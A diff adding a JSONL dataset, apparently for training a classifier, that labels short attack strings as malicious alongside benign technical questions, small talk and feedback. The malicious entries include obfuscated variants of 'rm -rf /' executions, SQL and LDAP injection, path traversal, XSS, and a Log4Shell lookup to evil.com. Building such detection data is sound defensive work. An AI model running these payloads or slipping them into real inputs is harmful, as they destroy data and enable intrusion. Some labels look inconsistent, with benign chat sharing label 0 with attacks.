@@ -1,0 +1,292 @@
+{"text": "exec('rm​ -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "The interface is user-friendly.", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "evаl('alert(1)')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Explain the concept of dependency injection", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm​ -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "../../../etc/passwd​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "evаl('alert(1)')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "the service works well.", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "<script>аlert('xss')</script>", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "​隐藏​字符", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "The service works well.", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP​ TABLE ​users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Show me how to write a for loop in JavaScript", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "../../../etc/passwd", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What are the benefits of AWS?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "DROP  TABLE  users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "rm​ -rf ​/", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "eval('alert(1)')‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "exeс('rm  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "This is exactly what I needed.", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP  TаBLE  users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "../../../etc/passwd‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "eVaL('alert(1)')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "UNION SеLECT null, null, null FROM information_schema.tables", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "I appreciate it.", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "This is exactly what I needed.", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "I'm learning about Encryption", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "How do I handle errors in Python?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "​隐藏​字符‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "rm  -rf  /", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "what are your business hours?", "label": 0, "category": "general_questions", "subcategory": "normal_benign"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Can you explain what is a database index?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP TABLE users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP  TABLе  users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "еxec('rm  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "rm  -rf  /", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "thanks for your help!", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "exeс('rm  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "i appreciate it.", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "what are your business hours?", "label": 0, "category": "general_questions", "subcategory": "normal_benign"}
+{"text": "How do I create a new branch in git?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "I'm learning about JWT", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "What should I know about MongoDB?", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "Show me best practices for Database", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "Explain git merge vs rebase", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "<script>alеrt('xss')</script>", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP​ TABLE ​users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "​隐藏​字符‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "exec('rm​ -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "I understand now.", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "​隐藏​字符", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "​隐藏​字符​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "How do I create a new branch in git?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "rm\\x20-rf\\x20/", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "<script>alеrt('xss')</script>", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "I would recommend this.", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "How does caching improve performance?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "How should I implement MongoDB?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "How should I implement AWS?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "DROP  TаBLE  users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Show me best practices for Authentication", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "exec('rm​ -rf ​/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "where is your office?", "label": 0, "category": "general_questions", "subcategory": "normal_benign"}
+{"text": "../../../etc/passwd", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What are your business hours? Thanks!", "label": 0, "category": "general_questions", "subcategory": "normal_benign"}
+{"text": "What is the recommended way to use Kubernetes?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "What are the benefits of using Docker?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "How does MongoDB work?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What are best practices for Encryption?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "​隐藏​字符‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "How do I sort an array in Java?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "DROP​ TABLE users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Explain git merge vs rebase", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "../../../etc/pаsswd", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "DROP​ TABLE users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Can you teach me about MongoDB?", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "I want to understand Docker better", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "<script>alert('xss')</script>‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "rm\\x20-rf\\x20/", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "How does caching improve performance?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "import os; os.system('rm -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "i understand now.", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Hello, how are you?", "label": 1, "category": "unknown", "subcategory": "unknown", "pattern": "technical_question"}
+{"text": "еval('alert(1)')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "​隐藏​字符", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "this is exactly what i needed. Thanks!", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "exec('rm​ -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What are the best practices when working with API?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "Can you teach me about REST?", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "What should I know about MongoDB?", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP TаBLE users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "How do I sort an array in Java?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "What are the benefits of API?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Can you explain Authentication to me?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "exec('rm  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "Explain Database for beginners", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "i appreciate it.", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "​隐藏​字符‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP  TABLE  users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "../../../etc/pаsswd", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "../../../etc/passwd​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "I would recommend this.", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "How should I implement GraphQL?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "i would recommend this.", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "the service works well.", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "Show me best practices for API", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "what is your refund policy? Thanks!", "label": 0, "category": "general_questions", "subcategory": "normal_benign"}
+{"text": "How long is the trial period?", "label": 0, "category": "general_questions", "subcategory": "normal_benign"}
+{"text": "Explain Kubernetes for beginners", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Can you teach me about React?", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "Tell me about REST API best practices", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "DROP​ TABLE ​users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What is the purpose of environment variables?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "Show me best practices for JavaScript", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "еval('alert(1)')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "That's interesting. Thanks!", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "Explain TLS for beginners", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "Hello, how are you?", "label": 1, "category": "unknown", "subcategory": "unknown", "pattern": "technical_question"}
+{"text": "I appreciate it.", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "import\\x20os;\\x20os.system('rm\\x20-rf\\x20/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Tell me about REST API best practices", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "<script>alеrt('xss')</script>", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "SELECT * FROM users WHERE id=1 OR 1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "../../../еtc/passwd", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "have a great day! Thanks!", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "<script>alert('xss')</script>​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Explain the difference between list and tuple in Python", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "Can you explain PostgreSQL to me?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "Can you explain JavaScript to me?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "jаva.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP  TABLе  users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "../../../etc/passwd​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "How does authentication work?", "label": 1, "category": "security_education", "subcategory": "general_security", "pattern": "technical_question"}
+{"text": "<script>alert('xss')</script>​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "exec('rm​ -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "jAvA.lang.Runtime.getRuntime().exec('rm    -rf    /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Good to know!", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "../../../etc/passwd", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP​ TABLE ​users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "I understand now.", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "What is the difference between Database and React?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "eval('alert(1)')​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "*)(uid=*))(|(uid=*", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Explain Git for beginners", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP​ TABLE users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What are the benefits of TLS?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "rm​ -rf /", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Where is your office?", "label": 0, "category": "general_questions", "subcategory": "normal_benign"}
+{"text": "Thanks for your help!", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "exec('rm​ -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What is your refund policy?", "label": 0, "category": "general_questions", "subcategory": "normal_benign"}
+{"text": "еval('alert(1)')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "eVaL('alert(1)')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "How do I create a new branch in git?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "<ScRipt>alert('xss')</script>", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Explain git merge vs rebase", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "I want to understand SSL better", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "How do I use API?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "How do I use JavaScript?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "rm  -rf  /", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "How should I implement SSL?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP  TABLE  users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "I appreciate it.", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "thanks for your help!", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "​隐藏​字符‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "​隐藏​字符", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Have a great day!", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Explain the concept of dependency injection", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "exec('rm\\x20-rf\\x20/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "<script>аlert('xss')</script>", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What are best practices for OAuth?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "eval('alert(1)')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "that's interesting.", "label": 0, "category": "small_talk", "subcategory": "normal_benign"}
+{"text": "Can you teach me about Cloud?", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "rm​ -rf /", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Can you teach me about SSL?", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "Can you explain Git to me?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "​隐藏​字符​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "The interface is user-friendly. Thanks!", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Explain the concept of dependency injection", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "import os; os.systеm('rm -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP  TABLE  users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "I'm satisfied with the results.", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What are best practices for Authorization?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Explain the concept of dependency injection", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "../../../еtc/passwd", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "exeс('rm -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "rm​ -rf ​/", "label": 0, "category": "malicious", "subcategory": "malicious"}
